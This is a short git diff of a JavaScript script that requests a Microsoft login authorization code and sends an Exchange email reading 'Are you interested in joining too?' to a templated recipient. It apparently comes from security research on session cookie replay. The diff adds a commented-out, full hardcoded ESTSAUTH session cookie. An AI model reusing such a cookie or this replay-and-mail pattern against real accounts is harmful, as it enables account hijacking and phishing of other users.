@@ -14,6 +14,9 @@ var response_type="code"
 
 var url = `${authority}client_id=${client_id}&response_mode=${response_mode}&response_type=${response_type}&code_challenge=${code_challenge}&code_challenge_method=S256&scope=${scope}`
 
+/* var cookie = require('./cookie.json')[1]
+var cookie ='ESTSAUTH=0.AU8Aob9kVo4CGUeayFrKkf4ofgMAAAAAAPEPzgAAAAAAAABPANs.AgABAAQAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P9rYYZtONsJmfNln1UEXQE-vl6AJfi-8Fi3yA2bFacjU1paumqAHAmzie8sXevuDVLSw8GUKITQswUlVmEad5hO7JZ26wNnJ-gRtTb2F70Q1byoFiQds0HSVNySr6nsCUdxQ1Vtmu9vqWQDRCh7mZ66nQ3Gwr13KuuGH3BL2qbG__Jfs3oIZsoOZYiNiJKSg-5406lnfpkKuZRuF4n8EyJwAMUcO2ACoIG_JwymS_XmGo8V_BFlqZDlFcPFZKldQADgZ9hmyVC4WiMb8r54pTBFdA6f28q9d2HZmB49_lq9D-s5kIK-rPS0uDussDIMGYtr2yPq4c-TCndLJ4HNgs_g6-KKNRhtz6Nf5WBhLOeFd6pqrVY7gz-boHv1AGwLnCSCY1XPkE4-gSVEw925Ta_cdNsOAM2aFiUcKd1FBaGAx1NpZMZyvIHNuzBP5sar0MzJT57jA0c3paXc7r0sKyFOGZYO6pjKoZ5XPQ; domain=.login.microsoftonline.com; path=/; secure; HttpOnly; SameSite=None'
+ */
 
 var {headers,data} = await axios( {
 url,
@@ -84,7 +87,7 @@ xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
       <t:Body BodyType="HTML">Are you interested in joining too?</t:Body>
       <t:ToRecipients>
         <t:Mailbox>
-          <t:EmailAddress>joosua@thx138.onmicrosoft.com</t:EmailAddress>
+          <t:EmailAddress>${tsd.upn}</t:EmailAddress>
           </t:Mailbox>
       </t:ToRecipients>
     </t:Message>
